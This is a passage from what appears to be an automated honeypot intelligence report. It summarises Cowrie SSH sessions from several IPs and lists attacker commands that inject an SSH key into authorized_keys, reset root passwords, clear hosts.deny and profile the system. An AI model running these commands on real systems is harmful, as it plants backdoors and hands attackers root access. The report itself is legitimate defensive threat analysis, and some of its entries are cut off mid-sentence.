free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
ls -lh $(which ls)
which ls
... (+10 more)
```

---

### Pattern: 7bed0997f4de...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 103.143.238.207

#### Analysis

**Attack Type:** Backdoor installation via SSH key injection + reconnaissance  
**Objective:** Gain SSH access to the honeypot and collect system information for profiling.  
**Techniques:**  
- `chattr -ia` & `lockr -ia` to hide `.ssh` directory  
- Creation of a new `.ssh` folder, echoing an RSA public key into `authorized_keys`  
- Setting restrictive permissions (`chmod -R go= ~/.ssh`)  
- Attempted password changes via `passwd` (likely to set a known password)  
- System‑info commands: CPU, memory, process list, crontab, user info, disk usage.  

**Indicators of Compromise (IOCs):**  
- Attacker IP: **103.143.238.207** (Hong Kong)  
- RSA public key string in `authorized_keys` (e.g., “ssh‑rsa AAAAB3NzaC1yc2EAAAABJQ…”)  
- File path: `.ssh/authorized_keys`  

**Threat Level:** Medium – moderate sophistication, potential for unauthorized access.  

**Brief Summary:** The attacker injected an SSH key into the honeypot’s `authorized_keys`, attempted to set a known password, and performed extensive system‑information gathering to profile the target.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo -e "123\nEsG0PwWezIKo\nEsG0PwWezIKo"|passwd|bash
Enter new UNIX password: 
Enter new UNIX password:
echo "123\nEsG0PwWezIKo\nEsG0PwWezIKo\n"|passwd
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
... (+12 more)
```

---

### Pattern: e320b52b41fd...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 212.154.234.9

#### Analysis

**Attack Type:** Backdoor installation with reconnaissance  
**Objective:** Install an SSH key for remote access and gather system information to assess the target’s capabilities.  
**Techniques:**  
- Creation of `.ssh` directory, injection of a hard‑coded RSA public key into `authorized_keys`.  
- Permission manipulation (`chmod -R go= ~/.ssh`).  
- Password change attempts via piping `passwd`.  
- System reconnaissance commands (CPU info, memory usage, file listings, crontab, uptime, OS details).  

**Indicators of Compromise (IOCs):**  
- Attacker IP: **212.154.234.9**  
- RSA public key string (e.g., “ssh‑rsa AAAAB3NzaC1yc2EAAAABJQ…”) – can be hashed for detection.  
- File names accessed: `.ssh`, `authorized_keys`.  

**Threat Level:** Medium – moderate sophistication with a clear backdoor intent and basic reconnaissance.  

**Brief Summary:** The attacker from Kazakhstan injected an SSH key into the honeypot’s `.ssh` directory, attempted to change passwords, and performed system‑information queries to evaluate the target before establishing remote access.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo -e "princess\nNuZuPIY8fetA\nNuZuPIY8fetA"|passwd|bash
Enter new UNIX password: 
Enter new UNIX password:
echo "princess\nNuZuPIY8fetA\nNuZuPIY8fetA\n"|passwd
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
... (+12 more)
```

---

### Pattern: bc1481c4a70e...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 45.172.153.100

#### Analysis

**Attack Type:** Backdoor installation (SSH key injection) with reconnaissance  
**Objective:** Gain remote access to the host by adding an authorized SSH key and setting a new root password; gather system information for further exploitation.  
**Techniques:**  
- `chattr`/`lockr` to lock `.ssh` directory, then overwrite it with a new public key.  
- `echo … | chpasswd | bash` to change the root password.  
- System‑info commands (`cpuinfo`, `free`, `uname`, etc.) for reconnaissance.  
- Process killing (`pkill -9`) and disabling `/etc/hosts.deny`.  
**Indicators of Compromise (IOCs):**  
- Attacker IP: **45.172.153.100**  
- SSH public key string: `ssh-rsa AAAAB3NzaC1yc2EAAAABJQ...`  
- Root password attempt: `root:4f5RO1Z8FQDD` (plain text).  
- Files targeted: `.ssh`, `/tmp/secure.sh`, `/tmp/auth.sh`, `/etc/hosts.deny`.  
**Threat Level:** Medium – moderate sophistication with potential for persistent remote access.  
**Brief Summary:** The attacker injected an SSH key and attempted to reset the root password, while performing system reconnaissance to prepare a backdoor.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo "root:4f5RO1Z8FQDD"|chpasswd|bash
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts....
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
which ls
ls -lh $(which ls)
... (+10 more)
```

---

### Pattern: ceba42745d6b...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 191.210.70.23

#### Analysis

**Attack Type:** Backdoor / credential injection  
**Objective:** Gain privileged (root) access to the system by installing an SSH key and setting a root password.  

**Techniques & Tools Used:**  
- `chattr`, `lockr` – attempt to lock file attributes (likely ineffective).  
- Creation of `.ssh/authorized_keys` with a hard‑coded RSA public key.  
- `chmod -R go= ~/.ssh` – restrict permissions on the SSH directory.  
- `echo "root:7FMhq7OHVQjw"|chpasswd|bash` – set root password via chpasswd.  
- Process killing (`pkill -9`) and modification of `/etc/hosts.deny`.  

**Indicators of Compromise (IOCs):**  
- Attacker IP: **191.210.70.23** (Brazil).  
- RSA public key string in `authorized_keys` (e.g., “ssh‑rsa AAAAB3NzaC1yc2EAAAABJQ…”).  
- Root password hash or plaintext (“7FMhq7OHVQjw”).  

**Threat Level:** **High** – attacker achieved root-level access, potentially compromising the entire system.  

**Brief Summary:** The attacker injected a malicious SSH key and set a root password to establish a backdoor on the honeypot, enabling full administrative control.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo "root:7FMhq7OHVQjw"|chpasswd|bash
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts....
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
ls -lh $(which ls)
which ls
... (+10 more)
```

---

### Pattern: dff2d43f7a0a...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 116.193.191.100

#### Analysis

**Attack Type:** Backdoor installation with reconnaissance  
**Objective:** Install an SSH key for remote access and gather system information for profiling the target.  
**Techniques:**  
- SSH key injection (`authorized_keys` creation)  
- File attribute manipulation (`chattr`, `lockr`) to hide the key file  
- System info gathering via `/proc/cpuinfo`, `free`, `ls`, `crontab`, `uname`, `whoami`, `lscpu`, `df`.  
**Indicators of Compromise (IOCs):**  
- Attacker IP: **116.193.191.100** (Indonesia)  
- SSH key string: `"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr`  
- File path: `~/.ssh/authorized_keys`  
**Threat Level:** Medium – the attacker successfully installed a backdoor and performed basic reconnaissance.  
**Brief Summary:** The attacker injected an SSH key into the host’s authorized_keys file, obscured it with attribute locks, and collected system information to profile the target for future exploitation.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo -e "123qwe!@#\nh1FnmrXwxLhZ\nh1FnmrXwxLhZ"|passwd|bash
Enter new UNIX password: 
Enter new UNIX password:
echo "123qwe!@#\nh1FnmrXwxLhZ\nh1FnmrXwxLhZ\n"|passwd
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
... (+12 more)
```

---

### Pattern: 3a45247b5129...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 212.154.234.9

#### Analysis

**Attack Type:** Backdoor installation (SSH key injection + root password reset) combined with system reconnaissance.  
**Objective:** Gain persistent remote access via a malicious SSH key and elevate privileges by resetting the root password; gather system information for further exploitation.  
**Techniques:**  
- `chattr -ia .ssh` & `lockr -ia .ssh` to lock the `.ssh` directory.  
- Creation of a new `.ssh/authorized_keys` file with a hard‑coded RSA key.  
- `chmod -R go= ~/.ssh` to remove read/write permissions for others.  
- `chpasswd` to change root password (`root:uwNTcfsSUddK`).  
- System info queries (`cpuinfo`, `free`, `lscpu`, `uname`, `top`, etc.) for reconnaissance.  
**Indicators of Compromise (IOCs):**  
- Attacker IP: **212.154.234.9** (Kazakhstan).  
- Public SSH key string: `"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw==` (public key fingerprint).  
- File names: `.ssh/authorized_keys`, `/tmp/secure.sh`, `/tmp/auth.sh`.  
**Threat Level:** **High** – root password reset and SSH backdoor provide full system access.  
**Brief Summary:** The attacker injected a malicious SSH key, changed the root password, and performed extensive system reconnaissance to establish a persistent remote foothold.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo "root:uwNTcfsSUddK"|chpasswd|bash
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts....
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
ls -lh $(which ls)
which ls
... (+10 more)
```

---

### Pattern: 5208ef984f63...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 118.70.128.176

#### Analysis

**Attack Type:** Backdoor installation / credential compromise  
**Objective:** Gain privileged remote access by installing a malicious SSH key and resetting the root password.  
**Techniques:**  
- **SSH key injection** (`echo … > .ssh/authorized_keys` + `chmod -R go= ~/.ssh`)  
- **Root password reset** (`chpasswd` with “root:OtIXYATCtkJd”)  
- **Process cleanup** (`rm -rf /tmp/...; pkill -9 …`) and disabling hosts denial file.  
- **System reconnaissance** (CPU, memory, filesystem, crontab, user info).  

**Indicators of Compromise (IOCs):**  
- Attacker IP: 118.70.128.176  
- Public SSH key string: `ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr`  
- File: `.ssh/authorized_keys`  

**Threat Level:** **High** – attacker has gained root access and installed a backdoor, potentially enabling persistent control.  

**Brief Summary:** The attacker injected an SSH key and reset the root password to establish privileged remote access while collecting system information for reconnaissance.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo "root:OtIXYATCtkJd"|chpasswd|bash
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts....
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
ls -lh $(which ls)
which ls
... (+10 more)
```

---

### Pattern: c3f8ec25e306...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 45.172.153.100

#### Analysis

**Attack Type:** Backdoor installation (SSH key injection + password manipulation) with reconnaissance  
**Objective:** Gain remote SSH access to the host by installing a new authorized key and setting a weak user password, then gather basic system information.  
**Techniques:**  
- `lockr -ia` to hide the `.ssh` directory  
- Creation of `/home/.ssh/authorized_keys` with a custom RSA key  
- Password change via `passwd` (echoing passwords into the command)  
- System‑info commands (`cpuinfo`, `free`, `ls`, `crontab`, `uname`, etc.) for reconnaissance.  

**Indicators of Compromise (IOCs):**  
- Attacker IP: **45.172.153.100**  
- SSH key string: `"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"`  
- File: `/home/.ssh/authorized_keys`  

**Threat

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo -e "princess\nguZxK9mlGZYU\nguZxK9mlGZYU"|passwd|bash
Enter new UNIX password: 
Enter new UNIX password:
echo "princess\nguZxK9mlGZYU\nguZxK9mlGZYU\n"|passwd
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
... (+12 more)
```

---

### Pattern: 1cf4764c30cd...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 116.193.191.100

#### Analysis

**Attack Type:** Backdoor installation / credential theft  
**Objective:** Gain remote SSH access with root privileges on the target system.  

**Techniques & Tools Used:**  
- **SSH Key Injection** – created `.ssh/authorized_keys` with a hard‑coded RSA public key.  
- **Root Password Change** – used `chpasswd` to set a new root password (`root:9X5lx5O44mQs`).  
- **Permission Manipulation** – applied restrictive permissions on the `.ssh` directory and its contents.  
- **Process Termination & Host Deny** – killed potential monitoring processes and added an entry to `/etc/hosts.deny`.  

**Indicators of Compromise (IOCs):**  
- Attacker IP: `116.193.191.100` (Indonesia)  
- Public key string in the authorized_keys file:  
  ```
  ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr
  ```
- File modifications: `/tmp/secure.sh`, `/tmp/auth.sh` removal; `pkill -9 secure.sh`, etc.  

**Threat Level:** **High** – the attacker is attempting to establish persistent root-level access, potentially enabling further exploitation or data exfiltration.

**Brief Summary:**  
The attacker injected an SSH key and changed the root password on a Cowrie honeypot, aiming to gain remote administrative control over the system.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo "root:9X5lx5O44mQs"|chpasswd|bash
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts....
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
ls -lh $(which ls)
which ls
... (+10 more)
```

---

### Pattern: 1aecfeaa7a37...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 191.210.70.23

#### Analysis

**Attack Type:** Backdoor installation (SSH key injection)  
**Objective:** Gain remote SSH access to the honeypot machine, likely for further exploitation or botnet recruitment.  
**Techniques:**  
- Creation/overwriting of `.ssh` directory and `authorized_keys` file with a public RSA key (`ssh-rsa …`).  
- Permission changes (`chmod -R go= ~/.ssh`) to restrict access.  
- Attempts to set a new UNIX password via `passwd`.  
- System reconnaissance: CPU, memory, filesystem, crontab, uname, whoami, lscpu, df.  

**Indicators of Compromise (IOCs):**  
- Public SSH key string: `"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr`  
- Commands targeting `/proc/cpuinfo`, `free -m`, `ls`, `crontab`, `uname`, `whoami`, etc.  

**Threat Level:** Medium – the attacker successfully installs a backdoor but does not deploy additional malicious payloads.  

**Brief Summary:** The attacker injected an SSH key into

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo -e "123qwe!@#\nsIaIwpP4wY1u\nsIaIwpP4wY1u"|passwd|bash
Enter new UNIX password: 
Enter new UNIX password:
echo "123qwe!@#\nsIaIwpP4wY1u\nsIaIwpP4wY1u\n"|passwd
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
... (+12 more)
```

---

### Pattern: 01c0a8a394a8...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 202.70.78.237

#### Analysis

**Attack Type:**  
Backdoor installation (SSH credential injection)

**Objective:**  
Gain future remote access by adding a malicious SSH key to the honeypot’s `authorized_keys` file, while collecting basic system information for reconnaissance.

**Techniques & Tools Used:**
- File manipulation (`chattr`, `lockr`, `rm -rf`, `mkdir`) to secure and overwrite the `.ssh` directory.
- Injection of an RSA public key into `authorized_keys`.
- System‑info commands (`cat /proc/cpuinfo`, `free`, `uname`, `lscpu`, `df`, `top`, `whoami`, `crontab -l`, `w`) to gather hardware, memory, and user data.

**Indicators of Compromise (IOCs):**
- **Public SSH key:**  
`ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr`
- **File path:** `~/.ssh/authorized_keys`

**Threat Level:** High – the attacker successfully installed a remote access key and collected system details, enabling future exploitation.

**Brief Summary:**  
The attacker injected an SSH public key into the honeypot’s `.ssh` directory to establish a backdoor, while gathering basic system information for reconnaissance.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo -e "red\nLA384eCZEa0h\nLA384eCZEa0h"|passwd|bash
Enter new UNIX password: 
Enter new UNIX password:
echo "red\nLA384eCZEa0h\nLA384eCZEa0h\n"|passwd
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
... (+12 more)
```

---

### Pattern: 73c954df76a3...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 116.193.191.100

#### Analysis

**1. Attack Type:**  
Backdoor installation / botnet recruitment (remote access via SSH).

**2. Objective:**  
Gain remote control of the host by creating an authorized SSH key and setting a predictable password (“steampass”), then gather system details to profile the machine for future exploitation.

**3. Techniques & Tools Used:**
- **SSH Key Injection:** `echo … > .ssh/authorized_keys` with a random RSA public key.
- **Password Manipulation:** `passwd` commands to set “steampass”.
- **System Reconnaissance:** CPU info, memory usage, disk space, process list (`top`, `uname`, etc.).
- **Permission Alteration:** `chmod -R go= ~/.ssh`.

**4. Indicators of Compromise (IOCs):**
- Attacker IP: 116.193.191.100
- Public key string in authorized_keys (e.g., “ssh‑rsa AAAAB3NzaC1yc2EAAAABJQ…”)
- Password pattern: “steampass”
- File path: `~/.ssh/authorized_keys`

**5. Threat Level:** Medium – moderate sophistication with potential for remote exploitation.

**6. Brief Summary:**  
The attacker injected an SSH key and set a known password to establish remote access, while collecting system information for profiling, indicating a botnet recruitment or backdoor installation attempt.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo -e "steampass\n1k0nG5w889is\n1k0nG5w889is"|passwd|bash
Enter new UNIX password: 
Enter new UNIX password:
echo "steampass\n1k0nG5w889is\n1k0nG5w889is\n"|passwd
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
... (+12 more)
```

---

### Pattern: bfaa05bd0cca...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 202.70.78.237

#### Analysis

**Attack Type:** Backdoor installation (SSH key injection) with reconnaissance  
**Objective:** Gain remote access via an injected SSH key and gather system information for further exploitation.  
**Techniques:**  
- Manipulation of `.ssh` directory (`chattr`, `lockr`, `rm -rf`, `mkdir`) to create a clean environment.  
- Injection of a public‑key into `authorized_keys`.  
- Use of `passwd` with echoed passwords to set a new UNIX password.  
- System reconnaissance commands (`cat /proc/cpuinfo`, `free`, `ls`, `uname`, `top`, `whoami`, `df`).  

**Indicators of Compromise (IOCs):**  
- Attacker IP: **202.70.78.237**  
- SSH public key string: `ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr`.  

**Threat Level:** **High** – the attacker has installed a backdoor and gathered system details, enabling potential remote exploitation.  

**Brief Summary:** The attacker injected an unauthorized SSH key into the honeypot’s `.ssh` directory, attempted to set a new password, and performed extensive system reconnaissance, indicating a high‑risk backdoor installation.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo -e "123\nKYjGdqpXpsat\nKYjGdqpXpsat"|passwd|bash
Enter new UNIX password: 
Enter new UNIX password:
echo "123\nKYjGdqpXpsat\nKYjGdqpXpsat\n"|passwd
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
... (+12 more)
```

---

### Pattern: 4386a057c19c...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 201.76.120.30

#### Analysis

**Attack Type:** Backdoor installation (SSH key injection) with reconnaissance  
**Objective:** Gain remote access via SSH and gather system information for further exploitation.  
**Techniques:**  
- Manipulation of `~/.ssh` directory (`chattr`, `lockr`, `rm -rf`, `mkdir`) to create an authorized_keys file containing a suspicious RSA key.  
- Attempted root password change using `chpasswd`.  
- System reconnaissance commands: CPU info, memory usage, process list, uptime, etc.  
**Indicators of Compromise (IOCs):**  
- Attacker IP: **201.76.120.30** (Brazil)  
